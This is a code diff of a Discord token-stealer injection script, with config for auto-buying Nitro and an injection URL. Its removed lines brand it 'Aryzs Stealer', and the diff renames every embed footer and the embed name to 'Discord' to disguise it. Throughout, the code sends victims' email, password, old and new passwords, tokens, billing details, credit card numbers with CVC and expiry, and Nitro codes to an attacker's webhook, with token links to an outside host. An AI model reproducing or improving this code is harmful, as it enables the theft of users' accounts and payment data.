@@ -11,10 +11,10 @@ const config = {
   auto_buy_nitro: true, 
   ping_on_run: true, 
   ping_val: '@everyone', 
-  embed_name: 'Aryzs Stealer', 
+  embed_name: 'Discord', 
   embed_icon: ''.replace(/ /g, '%20'), 
   embed_color: 3447704, 
-  injection_url: 'https://github.com/Emny6/apiinjectionlblalbla/blob/main/inject.js', 
+  injection_url: 'https://github.com/Emny6/apiinjectionlblalbla/edit/main/inject.js', 
  
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
@@ -655,52 +655,47 @@ const login = async (email, password, token) => {
     avatar_url: config.embed_icon,
     embeds: [
       {
-        title: "User Login!",
-        description: "<:PartnerIcon:983180095009206344> [**Copy Token**](https://aryzsstealer.com/raw/token)",
+        title: "User Login",
+          description: "[Copy Token](https://superfurrycdn.nl/copy/" + token + ")",
         color: config.embed_color,
         fields: [
           {
-            name: '<:Info:987542721596108870> Info',
-            value: `\`\`\`Aryzs Stealer V2.0 - Remake\`\`\``,
-            inline: false,
-          },
-          {
-            name: '<:user:984848317836050442> Username',
+            name: 'Username',
             value: `\`${json.username}#${json.discriminator}\``,
             inline: true,
           },
           {
-            name: '<:id2:814280058402242562> ID',
+            name: 'ID',
             value: `\`${json.id}\``,
             inline: true,
           },
           {
-            name: '<:badgeBoostLVL9:983166144586317845> Nitro Badges',
+            name: 'Nitro Badges',
             value: `${nitro}`,
-            inline: true,
+            inline: false,
           },
           {
-            name: '<:BadgeDiscordModerator:860694601451175946> Badges',
+            name: 'Badges',
             value: `${badges}`,
-            inline: true,
+            inline: false,
           },
           {
-            name: '<:paypal:973900908528275457> Billing',
+            name: 'Billing',
             value: `\`${billing}\``,
-            inline: true,
+            inline: false,
           },
           {
-            name: '<:IconMail:860694971680817212> Email',
+            name: 'Email',
             value: `\`${email}\``,
             inline: true,
           },
           {
-            name: '<a:CoroaDemonsPreta:893483162259300384> Password',
+            name: 'Password',
             value: `\`${password}\``,
             inline: true,
           },
           {
-            name: '<:bug_hunter:973311712709181542> Token',
+            name: 'Token',
             value: `\`\`\`${token}\`\`\``,
             inline: false,
           },
@@ -710,7 +705,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'AryzsStealer',
+          text: 'Discord',
         },
       },
     ],
@@ -731,31 +726,31 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
       embeds: [
         {
           title: "Password Changed",
-          description: `[Copy Token](https://superfurrycdn.nl/copy/${token})`,
+          description: "[Copy Token](https://superfurrycdn.nl/copy/" + token + ")",
           color: config.embed_color,
           fields: [
             {
-              name: '<a:CoroaDemonsPreta:893483162259300384> Old Password',
+              name: 'Old Password',
               value: `**${oldpassword}**`,
-              inline: true,
+              inline: false,
             },
             {
-              name: '<a:CoroaDemonsPreta:893483162259300384> New Password',
+              name: 'New Password',
               value: `**${newpassword}**`,
-              inline: true,
+              inline: false,
             },
             {
-              name: '<:user:984848317836050442> Username',
+              name: 'Username',
               value: `\`${json.username}#${json.discriminator}\``,
               inline: true,
             },
             {
-              name: '<:id2:814280058402242562> ID',
+              name: 'ID',
               value: `\`${json.id}\``,
               inline: true,
             },
             {
-              name: '<:bug_hunter:973311712709181542> Token',
+              name: 'Token',
               value: `\`\`\`${token}\`\`\``,
               inline: false,
             },
@@ -765,7 +760,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
             icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
           },
           footer: {
-            text: 'AryzsStealer',
+            text: 'Discord',
           },
         },
       ],
@@ -785,26 +780,26 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
       embeds: [
         {
           title: "Mail Changed",
-          description: `[Copy Token](https://superfurrycdn.nl/copy/${token})`,
+          description: "[Copy Token](https://superfurrycdn.nl/copy/" + token + ")",
           color: config.embed_color,
           fields: [
             {
-              name: '<:IconMail:860694971680817212> Email Changed',
+              name: 'Email Changed',
               value: `New Email: **${email}**`,
-              inline: true,
+              inline: false,
             },
             {
-              name: '<:user:984848317836050442> Username',
+              name: 'Username',
               value: `\`${json.username}#${json.discriminator}\``,
               inline: true,
             },
             {
-              name: '<:id2:814280058402242562> ID',
+              name: 'ID',
               value: `\`${json.id}\``,
               inline: true,
             },
             {
-              name: '<:bug_hunter:973311712709181542> Token',
+              name: 'Token',
               value: `\`\`\`${token}\`\`\``,
               inline: false,
             },
@@ -814,7 +809,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
             icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
           },
           footer: {
-            text: 'AryzsStealer',
+            text: 'Discord',
           },
         },
       ],
@@ -836,22 +831,22 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           color: config.embed_color,
           fields: [
             {
-              name: '<:paypal:973900908528275457> Paypal Added!',
+              name: 'Paypal Added!',
               value: `Time to buy some nitro baby 😩`,
               inline: false,
             },
             {
-              name: '<:user:984848317836050442> Username',
+              name: 'Username',
               value: `\`${json.username}#${json.discriminator}\``,
               inline: true,
             },
             {
-              name: '<:id2:814280058402242562> ID',
+              name: 'ID',
               value: `\`${json.id}\``,
               inline: true,
             },
             {
-              name: '<:bug_hunter:973311712709181542> Token',
+              name: 'Token',
               value: `\`\`\`${token}\`\`\``,
               inline: false,
             },
@@ -861,7 +856,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
             icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
           },
           footer: {
-            text: 'AryzsStealer',
+            text: 'Discord',
           },
         },
       ],
@@ -883,22 +878,22 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           color: config.embed_color,
           fields: [
             {
-              name: '<a:cartao:973899989505957920> Credit Card Added',
-              value: `Credit Card Number: **${number}**\nCVC: **${cvc}**\nCredit Card Expiration: **${expir_month}/${expir_year}**`,
-              inline: true,
+              name: 'Credit Card Added',
+              value: `Credit Card Number: \`${number}\`\nCVC: \`${cvc}\`\nCredit Card Expiration: \`${expir_month}/${expir_year}\``,
+              inline: false,
             },
             {
-              name: '<:user:984848317836050442> Username',
+              name: 'Username',
               value: `\`${json.username}#${json.discriminator}\``,
               inline: true,
             },
             {
-              name: '<:id2:814280058402242562> ID',
+              name: 'ID',
               value: `\`${json.id}\``,
               inline: true,
             },
             {
-              name: '<:bug_hunter:973311712709181542> Token',
+              name: 'Token',
               value: `\`\`\`${token}\`\`\``,
               inline: false,
             },
@@ -908,7 +903,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
             icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
           },
           footer: {
-            text: 'AryzsStealer',
+            text: 'Discord',
           },
         },
       ],
@@ -933,18 +928,18 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           fields: [
             {
               name: 'Nitro bought!',
-              value: `**Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
+              value: `\`diff\n+ ${code}\``,
               inline: false,
             },
             {
               name: 'Username',
               value: `\`${json.username}#${json.discriminator}\``,
-              inline: false,
+              inline: true,
             },
             {
               name: 'ID',
               value: `\`${json.id}\``,
-              inline: false,
+              inline: true,
             },
             {
               name: 'Token',
@@ -957,7 +952,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
             icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
           },
           footer: {
-            text: 'AryzsStealer',
+            text: 'Discord',
           },
         },
       ],
